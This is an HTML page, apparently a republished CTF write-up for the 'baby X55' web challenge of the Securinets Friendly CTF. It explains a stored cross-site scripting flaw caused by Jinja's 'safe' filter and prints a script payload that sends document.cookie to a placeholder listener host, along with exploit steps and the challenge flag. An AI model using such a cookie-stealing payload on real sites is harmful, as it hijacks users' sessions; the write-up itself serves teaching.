@@ -1,0 +1,54 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#100d0b">
+  <meta name="description" content="Reports are reviewed by an administrator bot. The report content is rendered as HTML, so a submitted script runs in the bot&#x27;s browser and leaks its flag cookie.">
+  <title>baby X55 | Securinets Friendly CTF | rouma</title>
+  <link rel="icon" href="../images/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="../css/style.css">
+  <script src="../js/main.js" defer></script>
+</head>
+<body>
+  <a class="skip-link" href="#article">Skip to article</a>
+  <header class="site-header">
+    <nav class="article-nav container" aria-label="Article navigation">
+      <a class="brand brand-signature" href="../index.html#home" aria-label="rouma, Home">rouma</a>
+      <a class="text-link" href="web-exploitation.html#securinets-friendly-ctf">&larr; Securinets Friendly CTF</a>
+    </nav>
+  </header>
+  <main id="article" class="article-main securinets-article container" tabindex="-1">
+    <p class="section-label">SECURINETS FRIENDLY CTF / WAVE 1 / EASY</p>
+    <h1>baby X55</h1>
+    <p class="template-notice">Original author: <strong>L-BOH</strong>. Shared for educational purposes; full credit goes to the original author. <a href="https://github.com/securinets-insat/Friendly-CTF-2026/blob/d4aa7b854bbc631b11313e6cba3edce0abb979c9/web-exp/wave1/baby_xss/writeup.md">Read the original writeup on GitHub</a>.</p>
+    <div class="writeup-content">
+<h2>Summary</h2>
+<p>Reports are reviewed by an administrator bot. The report content is rendered as HTML, so a submitted script runs in the bot's browser and leaks its flag cookie.</p>
+<h2>Root cause</h2>
+<p>The report detail template contains:</p>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-jinja">&lt;div class=&quot;detail-content&quot;&gt;{{ report[2] | safe }}&lt;/div&gt;
+</code></pre>
+<p>The <code>safe</code> filter disables Jinja's HTML escaping. A report body containing a script tag is therefore delivered as executable HTML. The review feature turns this stored XSS into an attack on the administrator bot.</p>
+<h2>Vulnerability</h2>
+<p>Create a report whose content contains harmless bold HTML. If the report detail page renders bold text rather than the tags, the application is treating report text as HTML. Because the page can be sent to the admin, this becomes stored XSS against the bot.</p>
+<h2>Exploit</h2>
+<ol>
+<li>Create an account and submit a report.</li>
+<li>Put this in its content, replacing <code>LISTENER</code> with a request bin or a server you control:</li>
+</ol>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-html">&lt;script&gt;location='https://LISTENER/?c='+encodeURIComponent(document.cookie)&lt;/script&gt;
+</code></pre>
+<ol start="3">
+<li>Open the report and choose <strong>Send to admin for review</strong>.</li>
+<li>Check the listener. The query parameter contains the admin bot's flag cookie.</li>
+</ol>
+<p>The payload uses navigation rather than a fetch request. Once the bot opens the report, the browser runs the stored script and leaves the site with the cookie in the URL.</p>
+<h2>Flag</h2>
+<pre tabindex="0" aria-label="Code or command example"><code class="language-text">Securinets{w3lcome_t0_cr0ss_s1te_scr1p71ng}
+</code></pre>
+    </div>
+    <p class="article-back"><a href="web-exploitation.html#securinets-wave1">&larr; Back to Wave 1 writeups</a></p>
+  </main>
+</body>
+</html>
